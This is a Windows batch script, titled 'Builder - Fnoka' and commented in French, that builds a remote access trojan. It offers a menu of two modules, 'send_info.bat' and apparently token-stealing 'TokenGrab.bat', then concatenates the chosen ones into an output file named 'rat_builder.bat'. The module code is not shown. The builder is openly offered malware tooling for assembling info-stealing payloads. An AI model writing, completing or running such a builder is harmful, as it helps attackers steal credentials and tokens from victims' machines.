@echo off
setlocal enabledelayedexpansion

title Builder - Fnoka

:: Chemin vers le répertoire de sortie
set outputDir=%~dp0output

:: Créer le répertoire de sortie s'il n'existe pas
if not exist "%outputDir%" mkdir "%outputDir%"

:: Chemin vers le fichier de sortie
set outputFile=%outputDir%\rat_builder.bat

:: Initialiser les variables pour les choix de l'utilisateur
set includeSendInfo=0
set includeTokenGrab=0

:: Afficher le menu de sélection
cls
echo [1m Choose features to add : [0m
echo [34m[1] Add send_info.bat [0m
echo [34m[2] Add TokenGrab.bat [0m
echo [34m[3] Finish and create the rat [0m
echo.

:: Boucle pour permettre à l'utilisateur de faire des choix
:menu
echo|set /p=".          [90;1m╚══>[0m"
set /p choice=
if "%choice%"=="1" set includeSendInfo=1
if "%choice%"=="2" set includeTokenGrab=1
if "%choice%"=="3" goto build

:: Afficher les choix actuels
echo.
echo [32mFeatures selected : [0m
if %includeSendInfo% equ 1 echo [32m- send_info.bat[0m
if %includeTokenGrab% equ 1 echo [32m- TokenGrab.bat[0m
echo.

goto menu

:: Assembler les fichiers sélectionnés
:build
set filesToCopy=
if %includeSendInfo% equ 1 set filesToCopy=!filesToCopy! "send_info.bat"
if %includeTokenGrab% equ 1 set filesToCopy=!filesToCopy! "TokenGrab.bat"

:: Verify if features as been added
if defined filesToCopy (
    :: Créer un fichier batch temporaire
    set tempBatch=%outputDir%\temp_builder.bat
    echo !filesToCopy! > !tempBatch!

    :: Lire le contenu des fichiers sélectionnés et les écrire dans le fichier de sortie
    for %%f in (!filesToCopy!) do (
        if exist "%%f" (
            type "%%f" >> !outputFile!
        ) else (
            echo Missing File : %%f
        )
    )

    :: Supprimer le fichier batch temporaire
    del !tempBatch!

    echo Rat as been succesfully created !: %outputFile%
) else (
    echo No file choose. The rat can't be created.
)

pause
exit